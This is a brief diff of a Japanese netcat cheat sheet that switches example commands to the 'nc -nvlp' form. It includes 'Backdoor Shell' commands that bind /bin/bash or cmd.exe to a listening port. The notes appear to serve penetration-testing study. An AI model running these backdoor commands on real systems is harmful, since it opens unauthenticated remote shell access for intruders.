@@ -13,15 +13,15 @@
 ```
 実行例(ポート1234でリッスン)：
 ```console
-$ncat -nlv 1234
+$nc -nvlp 1234
 ```
 実行例(Backdoor Shell)
 ```console
-$nc -l -p [port] -e /bin/bash
+$nc -nvlp [port] -e /bin/bash
 ```
 OR
 ```console
-C:\>nc [port] -e cmd.exe
+C:\>nc -nvlp [port] -e cmd.exe
 ```
 実行例(Ntcat Relays(Listener-to-Listner))
 ```console
